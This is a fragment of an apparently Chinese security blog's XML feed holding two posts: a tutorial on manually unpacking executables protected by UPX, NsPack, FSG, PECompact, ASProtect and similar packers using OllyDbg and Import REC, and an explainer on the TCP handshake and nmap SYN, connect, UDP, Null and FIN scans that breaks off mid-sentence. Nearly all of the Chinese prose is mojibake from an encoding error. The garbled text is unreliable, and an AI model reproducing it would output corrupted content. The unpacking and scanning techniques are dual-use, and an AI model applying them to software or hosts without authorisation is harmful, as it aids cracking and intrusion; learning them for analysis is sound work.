    <title>è„±å£³æ•™ç¨‹ç¬¬ä¸€è¯¾</title>
    <link href="/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/"/>
    <url>/2024/09/18/%E8%84%B1%E5%A3%B3%E6%95%99%E7%A8%8B%E7%AC%AC%E4%B8%80%E8%AF%BE/</url>
    
    <content type="html"><![CDATA[<h3 id="upx"><a href="#upx" class="headerlink" title="upx"></a>upx</h3><p>é¦–å…ˆæŸ¥å£³<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181712588.png" srcset="/img/loading.gif" lazyload></p><h4 id="æ‰‹è„±"><a href="#æ‰‹è„±" class="headerlink" title="æ‰‹è„±"></a>æ‰‹è„±</h4><p>äº†è§£æ˜¯upxç›´æ¥odæ‰“å¼€ï¼Œç›´æ¥å¾€ä¸‹é¢ç¿»ï¼Œæˆ–è€…ç”¨espæ³•ç›´æ¥æ‰¾åˆ°popadè·³è½¬<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181714591.png" srcset="/img/loading.gif" lazyload><br>çœ‹åˆ°å…ˆcallå†jmpç¡®è®¤ä¸ºOEPå…¥å£ç‚¹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181715614.png" srcset="/img/loading.gif" lazyload><br>ç›´æ¥odè„±å£³å¯è¿è¡Œç›´æ¥ä¸ç”¨ç®¡äº†</p><h3 id="NsPack"><a href="#NsPack" class="headerlink" title="NsPack"></a>NsPack</h3><h4 id="ESP"><a href="#ESP" class="headerlink" title="ESP"></a>ESP</h4><p>é¦–å…ˆæŸ¥å£³<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181716923.png" srcset="/img/loading.gif" lazyload><br>å‘ç°ä¸ºåŒ—æ–—Nspackå¯ä»¥åŒä¸Šç”¨æ‰‹è„±ï¼Œæˆ–è€…é‡‡ç”¨ESPå£³ï¼Œåœ¨pushfdä¹‹åå‘ç°ESPæ”¹å˜ï¼Œæˆ‘ä»¬é€‰æ‹©æ•°æ®çª—å£ä¸­è·Ÿéšï¼Œç„¶ååœ¨æ•°æ®çª—å£ä¸­é€‰æ‹©æ–­ç‚¹ï¼Œç¡¬ä»¶è®¿é—®ï¼ŒWordç„¶åç›´æ¥f9åˆ°è¾¾å‡ºæ ˆä½ç½®<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181717350.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181717510.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181719918.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181720629.png" srcset="/img/loading.gif" lazyload><br>ç„¶åç»§ç»­æ‰§è¡Œç›´åˆ°è¿›å…¥OEPï¼Œå‘ç°ä¹±ç ï¼Œcrtl+aè¿›è¡Œåˆ†æï¼Œå‘ç°æ–¹æ³•OEPç‰¹å¾<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181721792.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181722929.png" srcset="/img/loading.gif" lazyload><br>è„±å£³å®Œæ¯•å¯æ‰§è¡Œ</p><h3 id="FSG"><a href="#FSG" class="headerlink" title="FSG"></a>FSG</h3><h4 id="FSGç‰¹æ®Šçš„IATä¿®å¤ä»¥åŠæŸ¥æ‰¾"><a href="#FSGç‰¹æ®Šçš„IATä¿®å¤ä»¥åŠæŸ¥æ‰¾" class="headerlink" title="FSGç‰¹æ®Šçš„IATä¿®å¤ä»¥åŠæŸ¥æ‰¾"></a>FSGç‰¹æ®Šçš„IATä¿®å¤ä»¥åŠæŸ¥æ‰¾</h4><p>æ‰‹åŠ¨åœ¨è¿‡ç¨‹ä¸­æˆ‘ä»¬å‘ç°è¿™æ ·ä¸€ä¸ªè·³è½¬<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181724268.png" srcset="/img/loading.gif" lazyload>åœ¨ä¸‹é¢çš„XORå¤„æˆ‘ä»¬ä¾¿ä¼šè·³å‡ºå‡½æ•°ï¼Œç›´æ¥è·‘é£å‡½æ•°ï¼Œä½†æ˜¯åœ¨è¿™ä¹‹å‰æœ‰ä¸€ä¸ªå¤§å¾ªç¯ï¼Œå¯¼è‡´æˆ‘ä»¬åœ¨ä¸€ä¸ªåˆ¤æ–­å‡½æ•°ä¹‹é—´è·³è½¬<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181725004.png" srcset="/img/loading.gif" lazyload><br>æˆ‘ä»¬ç›´æ¥f4æ‰§è¡Œåˆ°æ­¤å¤„ï¼Œè¿›å…¥ï¼Œå‘ç°OPE<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181726582.png" srcset="/img/loading.gif" lazyload><br>OPEåœ¨å¤šæ¬¡æŸ¥é˜…ä¹‹åå‘ç°<br>è„±å£³åå‘ç°é—®é¢˜<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181727890.png" srcset="/img/loading.gif" lazyload><br>åœ¨å½“å‰çš„exeç¨‹åºä¸­æ— æ³•å®šä½IATå…¥å£ç‚¹ï¼Œæˆ‘ä»¬ç”¨Import RECä¿®å¤ï¼Œåœ¨OEPå…¥å£ç‚¹çš„callå‡½æ•°ä¸­æˆ‘ä»¬f7è¿›å…¥æŸ¥çœ‹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181729836.png" srcset="/img/loading.gif" lazyload><br>å‘ç°è¿™äº›çº¢å­—è°ƒç”¨ï¼Œæˆ‘ä»¬äº†è§£åˆ°è¿™æ˜¯å¯¹dllä¸­ä¸€äº›å‡½æ•°çš„è°ƒç”¨ï¼Œå³é”®ä¸€ä¸ªè°ƒç”¨callå‡½æ•°ï¼Œåœ¨æ•°æ®çª—å£ä¸­æ‰“å¼€ï¼Œé€‰æ‹©å†…å­˜åœ°å€ï¼Œå¹¶åœ¨æ•°æ®çª—æˆ·å£ä¸­é€‰æ‹©é•¿å‹åœ°å€æ¥å¸®åŠ©æˆ‘ä»¬æŸ¥çœ‹<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181731502.png" srcset="/img/loading.gif" lazyload><br>æ‰¾åˆ°è¿™ä¸ªæ•°æ®çª—å£çš„ä¸Šä¸‹ç•Œï¼Œè®¡ç®—å·®å€¼ï¼Œï¼ŒæŒ‰å›¾ä¸­å¡«å…¥æ•°å€¼ï¼Œäº†è§£æˆ‘ä»¬çš„åŸºåœ°å€æ˜¯400000ï¼Œå¤§å°å†™å·®å€¼ä¹Ÿå¯ä»¥å†™1000ï¼Œä¹‹åé€‰æ‹©æ— æ•ˆå‡½æ•°åˆ é™¤ï¼Œç›´æ¥å¯¼å…¥<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181732896.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181733944.png" srcset="/img/loading.gif" lazyload><br><img src="https://gitee.com/fogpost/photo/raw/master/202409181735661.png" srcset="/img/loading.gif" lazyload></p><p>ä¿®ç†å®Œæˆ</p><h3 id="PECompact"><a href="#PECompact" class="headerlink" title="PECompact"></a>PECompact</h3><p>æŸ¥å£³<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181737511.png" srcset="/img/loading.gif" lazyload><br>æ‰‹è„±æŠ€å·§ï¼Œåœ¨æ‰“å¼€è¿™ä¸ªæ–‡ä»¶æ—¶ï¼Œå‘ç°æœ‰å¤§é‡çš„æ— æ•ˆå‡½æ•°ï¼Œæˆ‘ä»¬é€‰æ‹©åˆ†æä¹‹åç›´æ¥æ‰§è¡Œï¼Œåœ¨PECå£³ä¸­æœ‰ä¸€ä¸ªé‡è¦å‡½æ•°ï¼ŒZxContinueï¼Œåœ¨å‘ç°è¿™ä¸ªå‡½æ•°æ—¶æˆ‘ä»¬ä¾¿å¯ä»¥è¿›å…¥ï¼Œå¿«é€Ÿå‘ç°OEP<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181739058.png" srcset="/img/loading.gif" lazyload><br>ä¹Ÿå¯ä»¥çœ‹æˆ‘åšå®¢ä¸­çš„å¦å¤–ä¸€ä¸ªå…³äºPECompactçš„å£³</p><h3 id="ASProtect"><a href="#ASProtect" class="headerlink" title="ASProtect"></a>ASProtect</h3><p>æŸ¥å£³<br><img src="https://gitee.com/fogpost/photo/raw/master/202409181759437.png" srcset="/img/loading.gif" lazyload><br>ç›´æ¥æ‰‹æ‰˜ä¸€è·¯åŠ¨å°±è¡Œï¼Œæ³¨æ„å…ˆåˆ†æä¸€ä¸‹ï¼Œå¦å¤–çš„æ–¹æ³•çœ‹æˆ‘çš„å¦ä¸€ç¯‡åšå®¢</p><h3 id="Upack"><a href="#Upack" class="headerlink" title="Upack"></a>Upack</h3><p>ç›´æ¥ESPå³å¯è„±å£³</p><h3 id="yoda"><a href="#yoda" class="headerlink" title="yoda"></a>yoda</h3><p>è¿™ä¸ªä¹Ÿå¯ä»¥ESP</p>]]></content>
    
    
    <categories>
      
      <category>reverse</category>
      
    </categories>
    
    
    <tags>
      
      <tag>è„±å£³</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>æ‰«æåŸºç¡€å’Œæ–¹å¼</title>
    <link href="/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/"/>
    <url>/2024/09/16/%E6%89%AB%E6%8F%8F%E5%9F%BA%E7%A1%80%E5%92%8C%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h3 id="å‰ææ¦‚è¦"><a href="#å‰ææ¦‚è¦" class="headerlink" title="å‰ææ¦‚è¦"></a>å‰ææ¦‚è¦</h3><p>åœ¨å­¦ä¹ Nmapæ—¶æˆ‘è®¤ä¸ºåªè¦äº†è§£æ“ä½œå°±è¡Œäº†ä¸è¿‡ï¼Œåœ¨æ€è€ƒä¹‹åæˆ‘è®¤ä¸ºæˆ‘ä»¬è¿˜æ˜¯åº”è¯¥å­¦ä¹ åŸºæœ¬çš„åŸç†å’ŒçŸ¥è¯†</p><h3 id="æ‰«æåŸºç¡€"><a href="#æ‰«æåŸºç¡€" class="headerlink" title="æ‰«æåŸºç¡€"></a>æ‰«æåŸºç¡€</h3><h4 id="3-5-1-TCP-ä¸‰æ¬¡æ¡æ‰‹"><a href="#3-5-1-TCP-ä¸‰æ¬¡æ¡æ‰‹" class="headerlink" title="3.5.1 TCP ä¸‰æ¬¡æ¡æ‰‹"></a>3.5.1 TCP ä¸‰æ¬¡æ¡æ‰‹</h4><p>ç¬¬ä¸€æ­¥ - å®¢æˆ·ç«¯å‘èµ·è¿æ¥è¯·æ±‚ï¼š</p><ul><li>å®¢æˆ·ç«¯å‘é€SYNï¼ˆåŒæ­¥ï¼‰åŒ…ï¼š å®¢æˆ·ç«¯å‘æœåŠ¡å™¨å‘é€ä¸€ä¸ªTCPåŒ…ï¼Œå…¶ä¸­SYNæ ‡å¿—ä½è¢«è®¾ç½®ä¸º1ï¼ŒåŒæ—¶é€‰æ‹©ä¸€ä¸ªåˆå§‹çš„åºåˆ—å·ï¼ˆSeq&#x3D;Xï¼‰ã€‚<blockquote><p>æºç«¯å£ï¼šéšæœºç«¯å£å·<br>ç›®æ ‡ç«¯å£ï¼šæœåŠ¡å™¨çš„TCPç«¯å£å·<br>SEQï¼šå®¢æˆ·ç«¯é€‰æ‹©çš„åˆå§‹åºåˆ—å·<br>ACKï¼š0<br>Flagsï¼šSYN&#x3D;1, ACK&#x3D;0, å…¶ä»–æ ‡å¿—ä½&#x3D;0<br>çª—å£å¤§å°ï¼šï¼ˆæ ¹æ®éœ€è¦è®¾ç½®</p></blockquote></li></ul><p>ç¬¬äºŒæ­¥ - æœåŠ¡å™¨å›åº”è¿æ¥è¯·æ±‚ï¼š</p><ul><li>æœåŠ¡å™¨å‘é€SYN-ACKåŒ…ï¼š æœåŠ¡å™¨æ”¶åˆ°å®¢æˆ·ç«¯çš„SYNåŒ…åï¼Œå¦‚æœæ„¿æ„å»ºç«‹è¿æ¥ï¼Œå°±å‘å®¢æˆ·ç«¯å‘é€ä¸€ä¸ªå“åº”ï¼Œå…¶ä¸­SYNå’ŒACKæ ‡å¿—ä½éƒ½è¢«è®¾ç½®ä¸º1ï¼ŒåŒæ—¶æœåŠ¡å™¨ä¹Ÿé€‰æ‹©ä¸€ä¸ªåˆå§‹çš„åºåˆ—å·ï¼ˆSeq&#x3D;Yï¼‰ï¼Œå¹¶ç¡®è®¤å®¢æˆ·ç«¯çš„åºåˆ—å·ï¼ˆAck&#x3D;X+1ï¼‰ã€‚<blockquote><p>æºç«¯å£ï¼šæœåŠ¡å™¨çš„TCPç«¯å£å·<br>ç›®æ ‡ç«¯å£ï¼šå®¢æˆ·ç«¯çš„éšæœºç«¯å£å·<br>SEQï¼šæœåŠ¡å™¨é€‰æ‹©çš„åˆå§‹åºåˆ—å·<br>ACKï¼šå®¢æˆ·ç«¯çš„åˆå§‹åºåˆ—å·+1<br>Flagsï¼šSYN&#x3D;1, ACK&#x3D;1, å…¶ä»–æ ‡å¿—ä½&#x3D;0<br>çª—å£å¤§å°ï¼šï¼ˆæ ¹æ®éœ€è¦è®¾ç½®ï¼‰</p></blockquote></li></ul><p>ç¬¬ä¸‰æ­¥ - å®¢æˆ·ç«¯ç¡®è®¤è¿æ¥ï¼š</p><ul><li>å®¢æˆ·ç«¯å‘é€ACKåŒ…ï¼š å®¢æˆ·ç«¯æ”¶åˆ°æœåŠ¡å™¨çš„SYN-ACKåŒ…åï¼Œå‘æœåŠ¡å™¨å‘é€ç¡®è®¤åŒ…ï¼Œå…¶ä¸­ACKæ ‡å¿—ä½è®¾ç½®ä¸º1ï¼Œç¡®è®¤æœåŠ¡å™¨çš„åºåˆ—å·ï¼ˆAck&#x3D;Y+1ï¼‰ã€‚<blockquote><p>æºç«¯å£ï¼šéšæœºç«¯å£å·<br>ç›®æ ‡ç«¯å£ï¼šæœåŠ¡å™¨çš„TCPç«¯å£å·<br>SEQï¼šå®¢æˆ·ç«¯çš„åˆå§‹åºåˆ—å·+1<br>ACKï¼šæœåŠ¡å™¨çš„åˆå§‹åºåˆ—å·+1<br>Flagsï¼šACK&#x3D;1, å…¶ä»–æ ‡å¿—ä½&#x3D;0<br>çª—å£å¤§å°ï¼šï¼ˆæ ¹æ®éœ€è¦è®¾ç½®ï¼‰</p></blockquote></li></ul><h3 id="æ‰«ææ–¹å¼"><a href="#æ‰«ææ–¹å¼" class="headerlink" title="æ‰«ææ–¹å¼"></a>æ‰«ææ–¹å¼</h3><h4 id="1-TCP-SYN-æ‰«æ"><a href="#1-TCP-SYN-æ‰«æ" class="headerlink" title="1 TCP SYN æ‰«æ"></a>1 TCP SYN æ‰«æ</h4><blockquote><p>nmap -sS ip</p></blockquote><p>TCP SYN æ‰«ææ˜¯ä¸€ç§ç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾ç«¯å£çš„ç½‘ç»œæ‰«ææŠ€æœ¯ã€‚å®ƒå±äº Nmap å·¥å…·ä¸­çš„ä¸€ç§æ‰«ææ–¹å¼ï¼Œé€šå¸¸ç”¨äºè·å–ç›®æ ‡ç³»ç»Ÿçš„ç«¯å£çŠ¶æ€ä¿¡æ¯ã€‚TCP SYN æ‰«æçš„åŸç†æ˜¯å‘é€TCP SYNåŒ…ï¼Œæ ¹æ®ç›®æ ‡ä¸»æœºçš„å“åº”æ¥åˆ¤æ–­ç«¯å£çš„çŠ¶æ€ã€‚</p><p>ä¸‹é¢æ˜¯ TCP SYN æ‰«æçš„å·¥ä½œåŸç†ï¼š  </p><blockquote><p>å‘é€TCP SYNåŒ…ï¼š æ‰«æå‘èµ·è€…ï¼ˆé€šå¸¸æ˜¯Nmapå·¥å…·ï¼‰å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€TCP SYNåŒ…ï¼ˆåŒæ­¥åŒ…ï¼‰ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºå°†è¿”å›ä¸€ä¸ªTCP SYN&#x2F;ACKåŒ…ï¼ˆåŒæ­¥&#x2F;åº”ç­”åŒ…ï¼‰è¡¨ç¤ºç«¯å£æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºå°†è¿”å›ä¸€ä¸ªTCP RSTåŒ…ï¼ˆå¤ä½åŒ…ï¼‰è¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚å¦‚æœæ”¶åˆ°äº† SYN&#x2F;ACK åŒ…ï¼Œè¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœæ”¶åˆ°äº† RST åŒ…ï¼Œè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ã€‚<br>ä¸å®Œå…¨å»ºç«‹è¿æ¥ï¼š åœ¨å®Œæˆç¬¬2æ­¥çš„è¿‡ç¨‹ä¸­ï¼Œæ‰«æå‘èµ·è€…ä¸ä¼šå®ŒæˆTCPè¿æ¥çš„å»ºç«‹ï¼Œè€Œæ˜¯åœ¨æ”¶åˆ°å“åº”åå‘é€ä¸€ä¸ª RST åŒ…ï¼Œå…³é—­è¿æ¥ã€‚è¿™æ ·ï¼Œæ‰«æå¯¹ç›®æ ‡ç³»ç»Ÿçš„å½±å“è¾ƒå°ï¼Œå› ä¸ºå®ƒä¸ä¼šå»ºç«‹å®Œæ•´çš„è¿æ¥ã€‚ </p></blockquote><h4 id="2-TCP-connect-æ‰«æ"><a href="#2-TCP-connect-æ‰«æ" class="headerlink" title="2 TCP connect() æ‰«æ"></a>2 TCP connect() æ‰«æ</h4><blockquote><p>æ­¤æ‰«æä¸ºé»˜è®¤æ‰«æï¼Œä¸ç”¨åŠ å‚æ•°</p></blockquote><p>TCP Connect æ‰«ææ˜¯ Nmap ä¸­çš„å¦ä¸€ç§å¸¸è§çš„æ‰«ææŠ€æœ¯ã€‚ä¸ TCP SYN æ‰«æç±»ä¼¼ï¼ŒTCP Connect æ‰«æä¹Ÿç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚å®ƒçš„å·¥ä½œåŸç†æ˜¯é€šè¿‡å°è¯•å»ºç«‹å®Œæ•´çš„TCPè¿æ¥æ¥åˆ¤æ–­ç›®æ ‡ä¸»æœºä¸Šçš„ç«¯å£çŠ¶æ€ã€‚</p><p>ä¸‹é¢æ˜¯ TCP Connect æ‰«æçš„å·¥ä½œåŸç†ï¼š</p><blockquote><p>å°è¯•å»ºç«‹å®Œæ•´çš„TCPè¿æ¥ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å°è¯•å»ºç«‹å®Œæ•´çš„TCPè¿æ¥ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºå°†æ¥å—è¿æ¥å¹¶è¿”å›ä¸€ä¸ªTCP ACKåŒ…ï¼ˆåº”ç­”åŒ…ï¼‰è¡¨ç¤ºç«¯å£æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œè¿æ¥å°è¯•å°†å¤±è´¥ï¼Œæ‰«æå‘èµ·è€…å°†æ”¶åˆ°ä¸€ä¸ªè¿æ¥æ‹’ç»é”™è¯¯ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚å¦‚æœè¿æ¥æˆåŠŸå»ºç«‹ï¼Œè¯´æ˜ç«¯å£æ˜¯å¼€æ”¾çš„ã€‚å¦‚æœè¿æ¥è¢«æ‹’ç»ï¼Œè¯´æ˜ç«¯å£æ˜¯å…³é—­çš„ã€‚<br>å®Œæˆè¿æ¥ï¼š ä¸ TCP SYN æ‰«æä¸åŒï¼ŒTCP Connect æ‰«æä¼šå°è¯•å»ºç«‹å®Œæ•´çš„è¿æ¥ã€‚å› æ­¤ï¼Œå¦‚æœè¿æ¥æˆåŠŸå»ºç«‹ï¼Œæ‰«æå‘èµ·è€…å¯èƒ½ä¼šç»§ç»­ä¸ç›®æ ‡ä¸»æœºäº¤æ¢ä¸€äº›æ•°æ®ã€‚</p></blockquote><h4 id="3-UDP-æ‰«æ"><a href="#3-UDP-æ‰«æ" class="headerlink" title="3 UDP æ‰«æ"></a>3 UDP æ‰«æ</h4><blockquote><p>nmap -sU ip</p></blockquote><p>UDPï¼ˆUser Datagram Protocolï¼‰æ‰«ææ˜¯ä¸€ç§ç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šå¼€æ”¾çš„ UDPï¼ˆéè¿æ¥æ€§åè®®ï¼‰ç«¯å£çš„æ‰«ææŠ€æœ¯ã€‚ä¸ TCP æ‰«æä¸åŒï¼ŒUDP æ‰«ææ¶‰åŠåˆ°å‘é€ UDP æ•°æ®åŒ…å¹¶åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”ã€‚ç”±äº UDP æ˜¯é¢å‘æ— è¿æ¥çš„åè®®ï¼ŒUDP æ‰«æç›¸å¯¹å¤æ‚ï¼Œå› ä¸ºæ²¡æœ‰ç±»ä¼¼äº TCP SYN&#x2F;ACK çš„ç¡®è®¤æœºåˆ¶ã€‚</p><p>ä»¥ä¸‹æ˜¯ UDP æ‰«æçš„å·¥ä½œåŸç†ï¼š</p><blockquote><p>å‘é€UDPæ•°æ®åŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®š UDP ç«¯å£å‘é€UDPæ•°æ®åŒ…ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºå°†ä¸å‘é€å“åº”ï¼Œæˆ–è€…å‘é€ä¸€ä¸ªUDPåº”ç­”åŒ…ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºé€šå¸¸ä¼šå‘é€ä¸€ä¸ªICMPä¸å¯è¾¾æ¶ˆæ¯ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚ç¼ºä¹ç¡®è®¤æœºåˆ¶ä½¿å¾— UDP æ‰«æç›¸å¯¹ä¸ç¨³å®šï¼Œå› ä¸ºç›®æ ‡ä¸»æœºå¯èƒ½é€‰æ‹©ä¸å“åº”è¯·æ±‚ï¼Œæˆ–è€…å“åº”åŒ…è¢«é˜²ç«å¢™è¿‡æ»¤ã€‚<br>éœ€è¦æ³¨æ„çš„æ˜¯ï¼ŒUDP æ‰«æå¯èƒ½ä¼šé¢ä¸´ä¸€äº›æŒ‘æˆ˜ï¼ŒåŒ…æ‹¬ï¼š<br>ä¸ç¨³å®šæ€§ï¼š ç”±äº UDP çš„é¢å‘æ— è¿æ¥æ€§è´¨ï¼Œæ‰«æå¯èƒ½ä¼šå—åˆ°ç›®æ ‡ä¸»æœºæˆ–é˜²ç«å¢™çš„é™åˆ¶ï¼Œå¯¼è‡´ç»“æœä¸ç¨³å®šã€‚<br>å“åº”è§£é‡Šï¼š åˆ†æ UDP å“åº”ç›¸å¯¹å¤æ‚ï¼Œå› ä¸ºç›®æ ‡ä¸»æœºå¯ä»¥é€‰æ‹©ä¸å“åº”ï¼Œæˆ–è€…å‘é€ä¸€äº›ä¸ç«¯å£çŠ¶æ€æ— å…³çš„ä¿¡æ¯ã€‚<br>é€Ÿåº¦è¾ƒæ…¢ï¼š ç”±äºUDPæ‰«ææ¶‰åŠç­‰å¾…å“åº”ï¼Œå¯èƒ½éœ€è¦è¾ƒé•¿æ—¶é—´æ¥å®Œæˆæ‰«æã€‚  </p></blockquote><h4 id="4-TCP-Null-æ‰«æ"><a href="#4-TCP-Null-æ‰«æ" class="headerlink" title="4 TCP Null æ‰«æ"></a>4 TCP Null æ‰«æ</h4><blockquote><p>nmap -sN ip</p></blockquote><p>TCP Null æ‰«ææ˜¯ Nmap å·¥å…·ä¸­çš„ä¸€ç§æ‰«ææŠ€æœ¯ï¼Œç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚ä¸ TCP SYN æ‰«æå’Œ TCP Connect æ‰«æä¸åŒï¼ŒTCP Null æ‰«æå°è¯•åˆ©ç”¨ TCP åè®®çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³å‘é€ä¸€ä¸ªä¸åŒ…å«ä»»ä½•æ ‡å¿—ä½çš„ TCP æŠ¥æ–‡ï¼Œæ¥åˆ¤æ–­ç«¯å£çš„çŠ¶æ€ã€‚</p><p>ä»¥ä¸‹æ˜¯ TCP Null æ‰«æçš„å·¥ä½œåŸç†ï¼š</p><blockquote><p>å‘é€TCP Null åŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ä¸€ä¸ªä¸åŒ…å«ä»»ä½•æ ‡å¿—ä½çš„ TCP æŠ¥æ–‡ï¼Œå³æ‰€æœ‰æ ‡å¿—ä½å‡è¢«è®¾ç½®ä¸ºé›¶ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºé€šå¸¸ä¼šå¿½ç•¥ TCP Null æŠ¥æ–‡ï¼Œä¸å‘é€ä»»ä½•å“åº”ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºå¯èƒ½ä¼šå‘é€ä¸€ä¸ª TCP RSTï¼ˆå¤ä½ï¼‰åŒ…ï¼Œè¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ ‡ä¸»æœºçš„å“åº”æ¥ç¡®å®šç«¯å£çš„çŠ¶æ€ã€‚ç¼ºä¹ä»»ä½•æ ‡å¿—ä½çš„ TCP Null æŠ¥æ–‡é€šå¸¸åœ¨æ­£å¸¸æ“ä½œä¸­æ˜¯ä¸åˆæ³•çš„ï¼Œå› æ­¤ï¼Œå¦‚æœæ”¶åˆ°å“åº”ï¼Œåˆ™å¯èƒ½è¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚  </p></blockquote><h4 id="5-TCP-FIN-æ‰«æ"><a href="#5-TCP-FIN-æ‰«æ" class="headerlink" title="5 TCP FIN æ‰«æ"></a>5 TCP FIN æ‰«æ</h4><blockquote><p>nmap -sF ip</p></blockquote><p>TCP FINï¼ˆFinishï¼‰æ‰«ææ˜¯ Nmap å·¥å…·ä¸­çš„ä¸€ç§æ‰«ææŠ€æœ¯ï¼Œç”¨äºæ¢æµ‹ç›®æ ‡ä¸»æœºä¸Šçš„å¼€æ”¾ç«¯å£ã€‚ä¸ TCP SYN æ‰«æå’Œ TCP Null æ‰«æç±»ä¼¼ï¼ŒTCP FIN æ‰«æå°è¯•åˆ©ç”¨ TCP åè®®çš„ä¸€ä¸ªç‰¹æ€§ï¼Œå³å‘é€ä¸€ä¸ªä¸åŒ…å« SYN æ ‡å¿—ä½å’Œå…¶ä»–æ ‡å¿—ä½ä¸ºé›¶çš„ TCP æŠ¥æ–‡ï¼Œæ¥åˆ¤æ–­ç«¯å£çš„çŠ¶æ€ã€‚</p><p>ä»¥ä¸‹æ˜¯ TCP FIN æ‰«æçš„å·¥ä½œåŸç†ï¼š</p><blockquote><p>å‘é€TCP FIN åŒ…ï¼š æ‰«æå‘èµ·è€…å‘ç›®æ ‡ä¸»æœºçš„æŒ‡å®šç«¯å£å‘é€ä¸€ä¸ªä¸åŒ…å« SYN æ ‡å¿—ä½çš„ TCP æŠ¥æ–‡ï¼Œå³ FIN æ ‡å¿—ä½è¢«è®¾ç½®ä¸º 1ï¼Œè€Œå…¶ä»–æ ‡å¿—ä½å‡è¢«è®¾ç½®ä¸ºé›¶ã€‚<br>ç­‰å¾…å“åº”ï¼š å¦‚æœç›®æ ‡ç«¯å£æ˜¯å¼€æ”¾çš„ï¼Œç›®æ ‡ä¸»æœºé€šå¸¸ä¼šå¿½ç•¥ TCP FIN æŠ¥æ–‡ï¼Œä¸å‘é€ä»»ä½•å“åº”ã€‚å¦‚æœç›®æ ‡ç«¯å£æ˜¯å…³é—­çš„ï¼Œç›®æ ‡ä¸»æœºå¯èƒ½ä¼šå‘é€ä¸€ä¸ª TCP RSTï¼ˆå¤ä½ï¼‰åŒ…ï¼Œè¡¨ç¤ºç«¯å£æ˜¯å…³é—­çš„ã€‚<br>åˆ†æå“åº”ï¼š æ‰«æå‘èµ·è€…é€šè¿‡åˆ†æç›®æ 